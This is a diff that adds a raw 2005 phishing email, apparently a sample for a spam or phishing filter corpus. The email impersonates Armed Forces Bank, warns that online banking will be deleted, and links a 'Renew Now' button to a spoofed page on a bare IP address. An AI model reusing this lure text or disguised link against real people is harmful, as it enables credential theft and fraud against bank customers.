@@ -1,0 +1,62 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 8D9AB2A88C
+	for <user@example.com>; Mon, 12 Sep 2005 10:12:36 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 8744F621C9A; Mon, 12 Sep 2005 10:12:36 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 6CA7C621C99
+	for <user@example.com>; Mon, 12 Sep 2005 10:12:36 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id KAA25548
+	for user@example.com; Mon, 12 Sep 2005 10:12:36 -0400
+Received: from alfa01.cgyhost.net ([207.38.19.101])
+	by mail.example.com with ESMTP id KAA25540
+	for <user@example.com>; Mon, 12 Sep 2005 10:12:35 -0400
+Received: from nobody by alfa01.cgyhost.net with local (Exim 4.50)
+	id 1EEp2w-0000S8-5g
+	for user@example.com; Mon, 12 Sep 2005 10:12:34 -0400
+To: user@example.com
+Subject: Online Banking and Bill Payment Deactivation Notice
+From: Armed Forces Bank <service@afbbank.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EEp2w-0000S8-5g@alfa01.cgyhost.net>
+Date: Mon, 12 Sep 2005 10:12:34 -0400
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - alfa01.cgyhost.net
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - alfa01.cgyhost.net
+Content-Length: 1720
+Lines: 21
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 139
+
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=iso-8859-1">
+<FONT face=Arial size=2><IMG height=25 alt="Armed Forces Bank" src="http://afbank.com/img2/logo1.gif" width=250 border=0><FONT face="Times New Roman" size=3> <BR><BR><FONT face=Arial size=2> Dear Armed Forces Bank Client,<BR><BR>   <BR> This is your official notification from Armed Forces Bank that the service(s) listed below<BR> will be deactivated and deleted if not renewed immediately. Previous notifications have<BR> been sent to the Billing Contact assigned to this account. As the Primary Contact, you<BR> must renew the service(s) listed below or it will be deactivated and deleted. <BR><BR><BR> <A href="http://221.144.51.78/www.afbank.com/verify_803fd66194f54c209ca32a006a43a1d550715dcb5b2c99c8fef0bb9ab89e0571/" target=_blank onfiltered="return ShowLinkWarning()"><FONT color=#003399>Renew Now</FONT></A>  your Armed Forces Bank Online Banking and Bill Pay Services. 
+<DIV><FONT color=#003399></FONT> </DIV>
+<DIV><BR> SERVICE : Armed Forces Bank with Bill Pay.<BR> EXPIRATION: September 10, 2005</DIV>
+<DIV> </DIV>
+<DIV><BR> Thank you,</DIV>
+<DIV> </DIV>
+<DIV> Armed Forces Bank Management Center Customer Support</DIV>
+<DIV> </DIV>
+<DIV><BR> ======================================== <BR>  IMPORTANT CUSTOMER SUPPORT INFORMATION<BR> ======================================== </DIV>
+<DIV> </DIV>
+<DIV> Please do not reply to this message. For any inquiries, contact Customer Service.</DIV>
+<DIV> </DIV>
+<DIV> Document Reference: (87051203).</DIV>
+<DIV> </DIV>
+<DIV> Armed Forces Bank, N.A. Member FDIC.  Equal Housing Lender.<BR> Copyright © 2005 Armed Forces Bank, N.A. All rights reserved.<BR><BR><BR></FONT></FONT></FONT></DIV>
+
+
+ 
+
+
+
